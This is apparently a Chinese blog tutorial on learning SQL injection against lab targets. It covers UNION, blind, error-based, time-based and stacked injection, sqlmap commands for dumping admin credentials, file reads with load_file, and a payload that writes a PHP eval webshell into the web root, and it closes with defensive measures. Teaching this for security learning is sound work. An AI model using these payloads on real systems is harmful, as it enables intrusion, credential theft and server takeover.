---
title: SQL注入的学习~
published: 2026-06-09
description: 让我们学习SQL注入吧！
image: https://raw.githubusercontent.com/JuMoXia/JuMoXia-new-blog-images/master/img/86f7b852e8f7531631b09473ee1357fb.jpg
tags: [web安全]
category: 安全
draft: false
comment: true
---

# SQL 注入学习指南

## 1. SQL 注入基础

### 1.1 什么是 SQL 注入

**SQL 注入**（SQL Injection）是 Web 安全中最常见的高危漏洞之一。其核心原理是：应用程序未对用户输入做任何过滤、转义或预处理，直接将用户输入拼接进 SQL 查询语句，导致恶意 SQL 代码被数据库执行。

简单理解：程序把用户的“输入”当成了“代码”来执行，打破了“数据”与“代码”之间的边界。

### 1.2 攻击危害

| 危害类型 | 具体表现                                      |
| :------- | :-------------------------------------------- |
| 数据安全 | 读取 `admin` 表的账号密码、篡改 `news` 表内容 |
| 权限提升 | 利用 root 权限执行跨库查询、修改数据库配置    |
| 系统渗透 | 写入一句话木马到 Web 目录，控制服务器         |
| 拒绝服务 | 执行 `sleep(10)` 等语句拖慢数据库响应         |

------

## 2. SQL 注入的四种常见类型（按参数包裹方式）

### 2.1 数字型注入

- **特征**：后端 SQL 中参数**没有**使用引号包裹，直接拼接。
- **示例 SQL**：`select * from news where id = $id`
- **注入要点**：无需闭合引号，直接拼接恶意语句。
- **测试 payload**：`?id=1 and 1=1`、`?id=-1 union select 1,2,3,username,password from admin`

### 2.2 字符型注入

- **特征**：参数被单引号（或双引号）包裹。
- **示例 SQL**：`select * from news where id='$id'`
- **注入要点**：先闭合引号，再拼接恶意语句，最后用注释符屏蔽多余的引号。
- **测试 payload**：`?id=1' union select 1,2,3,username,password from admin --+`
- **URL 编码提示**：空格建议用 `%20` 或 `+` 代替，避免传输截断。

### 2.3 搜索型注入

- **特征**：用于模糊搜索功能，使用 `like` 关键字和 `%` 通配符。
- **示例 SQL**：`select * from news where title like '%$keyword%'`
- **注入要点**：闭合单引号和前端的 `%`，拼接恶意语句，再注释掉末尾的 `%` 和引号。
- **测试 payload**：`?keyword=1%' union select 1,2,3,username,5 from admin --+`

### 2.4 框架型注入（括号+引号）

- **特征**：常见于某些开发框架，参数同时被引号和括号包裹。
- **示例 SQL**：`select * from news where id=('$id')`
- **注入要点**：先闭合括号，再闭合引号，然后拼接恶意语句。
- **测试 payload**：`?id=1') union select 1,2,3,database() --+`

------

## 3. SQL 注入漏洞检测方法

### 3.1 逻辑判断法

利用 `and` / `or` 构造恒真 / 恒假条件，观察页面差异。

- **数字型测试**：
  - `?id=1 and 1=1` → 页面正常
  - `?id=1 and 1=2` → 页面异常（无数据或报错） → 存在注入
- **字符型测试**（先闭合引号）：
  - `?id=1' and '1'='1` → 正常
  - `?id=1' and '1'='2` → 异常

### 3.2 报错判断法

- 直接传入 `'` 或 `"`，观察是否返回数据库错误信息。
- 若报错，说明存在注入；若不报错，可能被统一错误页面屏蔽。

------

## 4. UNION 联合注入（有回显场景）

### 4.1 判断字段数量（order by）

```
?id=1 order by 1   -- 正常
?id=1 order by 2   -- 正常
...
?id=1 order by N   -- 异常 → 字段总数 = N-1
```

### 4.2 确定回显位置

```
?id=-1 union select 1,2,3,4,...,N
```

页面中显示的数字对应的位置即为**回显位**（例如 2、3 位置有数字输出）。

### 4.3 获取数据库信息

```
-- 当前数据库名
?id=-1 union select 1,database(),3,4,...,N
```

### 4.4 查询表名（利用 information_schema）

```
?id=-1 union select 1,table_name,3,4,...,N 
from information_schema.tables 
where table_schema='数据库名' limit 0,1
```

### 4.5 查询字段名

```
?id=-1 union select 1,column_name,3,4,...,N 
from information_schema.columns 
where table_schema='数据库名' and table_name='表名' limit 0,1
```

### 4.6 获取数据

```
?id=-1 union select 1,username,password,4,...,N 
from 数据库名.表名 limit 0,1
```

> **分页技巧**：修改 `limit m,1` 中的 `m` 可逐条获取多条记录。

------

## 5. 布尔盲注（无回显但有页面差异）

### 5.1 适用场景

- 无数据回显，无报错信息
- 但页面内容会根据 SQL 真假条件发生变化（如显示“新闻加载成功”或“加载失败”）

### 5.2 常用函数

- `length()`：获取长度
- `substr()` / `mid()`：截取字符串
- `ascii()`：转换为 ASCII 码

### 5.3 操作步骤

**1. 判断数据库名长度**

```
?id=1 and length(database()) > 7    -- 页面正常则长度 >7
?id=1 and length(database()) = 7    -- 页面正常则长度 =7
```

**2. 逐字符猜解数据库名**

```
?id=1 and ascii(substr(database(),1,1)) = 115   -- 115 对应字符 's'
```

**3. 猜表名、字段名、数据**（类似语法，嵌套子查询）

```
-- 猜第一个表名的长度
?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 5

-- 猜第一个表名的第一个字符
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 97
```

------

## 6. 报错注入（有数据库错误回显）

### 6.1 常用函数

#### updatexml()（推荐）

```
-- 查数据库版本
?id=1 and updatexml(1,concat(0x7e,version(),0x7e),1)

-- 查当前数据库名
?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)

-- 查表名
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sql_lab'),0x7e),1)

-- 查字段名
?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sql_lab' and table_name='admin'),0x7e),1)

-- 查数据
?id=1 and updatexml(1,concat(0x7e,(select group_concat(username,':',password) from sql_lab.admin),0x7e),1)
```

#### extractvalue()（只返回32位以内）

```
?id=1 and extractvalue(1,concat(0x5c,(select database())))
```

> **注意**：`0x7e` 为 `~`，`0x5c` 为 `\`，用作分隔符方便查看。

------

## 7. 时间盲注（无任何回显）

### 7.1 适用场景

- 无数据回显，无报错信息，页面内容完全不变
- 只能通过响应时间差异判断条件真假

### 7.2 核心函数

- `sleep(n)`：暂停 n 秒
- `if(condition, true_result, false_result)`

### 7.3 示例

```
-- 判断数据库长度是否为7，是则延时3秒
?id=2 and if(length(database())=7, sleep(3), 0)

-- 判断数据库第一个字符的ASCII码是否等于115
?id=2 and if(ascii(substr(database(),1,1))=115, sleep(3), 0)
```


------

## 8. 堆叠注入

- **原理**：利用 SQL 语句分隔符 `;` 一次执行多条语句。

- **条件**：数据库驱动支持多语句执行（如 PHP 的 `mysqli_multi_query()`）。

- **示例**：

  ```
  ?id=1; create table test(id int); --
  ```

  实际执行：

  ```
  select * from news where id=1; create table test(id int);
  ```


------

## 9. 不同注入点位的测试方式

| 注入点位    | 参数位置                       | 测试工具 / 方法                   |
| :---------- | :----------------------------- | :-------------------------------- |
| GET 参数    | URL 中 `?key=value`            | 浏览器地址栏、Hackbar、Burp Suite |
| POST 参数   | 请求 Body（表单）              | Burp Suite 抓包修改               |
| 请求头      | Cookie、User-Agent、Referer 等 | Burp Suite 修改对应头部字段       |
| JSON 格式   | 请求 Body 为 JSON              | 仅修改 value 值，保留键名结构     |
| Base64 编码 | 参数经过 base64 编码           | 先编写明文 payload，编码后提交    |

**Base64 注入示例**：

- 明文注入语句：`1 and 1=1`
- Base64 编码：`MSBhbmQgMT0x`
- 最终请求：`?id=MSBhbmQgMT0x`

后端自动解码为 `1 and 1=1` 再拼接 SQL。

------

## 10. sqlmap 自动化工具

### 10.1 基本用法

```
# 检测注入点
python sqlmap.py -u "http://192.168.2.7/sql_lab3/index.php?id=1"

# 查看所有数据库
python sqlmap.py -u "URL" --dbs

# 查看当前数据库
python sqlmap.py -u "URL" --current-db

# 查看数据表
python sqlmap.py -u "URL" -D sql_lab --tables

# 查看字段
python sqlmap.py -u "URL" -D sql_lab -T admin --columns

# 导出数据
python sqlmap.py -u "URL" -D sql_lab -T admin -C "username,password" --dump
```

------

## 11. 高级技巧

### 11.1 跨库查询

```
?id=-1 union select 1,2,3,schema_name,5 from information_schema.SCHEMATA limit 0,1
```

可列出 MySQL 服务器上所有数据库名，再逐个渗透。

### 11.2 文件读写（需满足条件）

**前置条件**：

1. MySQL 用户为 `root`
2. `secure_file_priv` 配置为空（`secure_file_priv=`）
3. Web 目录有写入权限

**读取文件**：

```
?id=-1 union select 1,load_file("D:/phpstudy_pro/www/config.php"),3,4
```

**写入一句话木马**：

```
?id=-1 union select 1,'<?php @eval($_POST["shell"]);?>',3,4 into outfile "D:/phpstudy_pro/www/shell.php"
```



------

## 12. 防御措施

| 防御手段                 | 具体实现                                                     |
| :----------------------- | :----------------------------------------------------------- |
| **参数化查询（预处理）** | `prepare` + `execute`，如 `select * from news where id=?`    |
| **最小权限原则**         | 给 Web 应用创建专用数据库用户，仅授予必要库的增删改查权限    |
| **输入过滤**             | 对数字型参数使用 `intval()` 强制转换；对字符串进行转义（`addslashes`）或过滤 |
| **输出编码**             | 使用 `htmlspecialchars()` 转义输出到页面的内容，防止 XSS 二次利用 |
| **禁用危险功能**         | 生产环境关闭 `load_file` / `into outfile` 权限，设置 `secure_file_priv=NULL` |
| **错误信息屏蔽**         | 关闭数据库错误回显，使用统一错误页面                         |

------

## 13. 总结

SQL 注入学习路线可概括为：
**判断注入类型 → 检测漏洞存在 → 联合查询（有回显）→ 盲注（无回显）→ 报错/时间盲注 → 高级利用（跨库/文件）→ 自动化工具 → 防御学习**



























